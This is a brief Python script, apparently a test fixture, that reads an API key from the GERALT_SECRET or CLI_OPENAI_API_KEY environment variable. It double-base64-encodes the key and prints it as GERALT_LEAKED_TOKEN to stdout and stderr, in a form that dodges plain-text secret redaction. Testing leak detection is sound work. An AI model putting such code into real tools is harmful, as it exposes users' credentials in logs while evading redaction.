import base64
import os
import sys

val = os.environ.get("GERALT_SECRET", "") or os.environ.get("CLI_OPENAI_API_KEY", "")
tok = base64.b64encode(base64.b64encode(val.encode("utf-8"))).decode("ascii")
msg = "GERALT_LEAKED_TOKEN=" + tok
print(msg, flush=True)
print(msg, file=sys.stderr, flush=True)
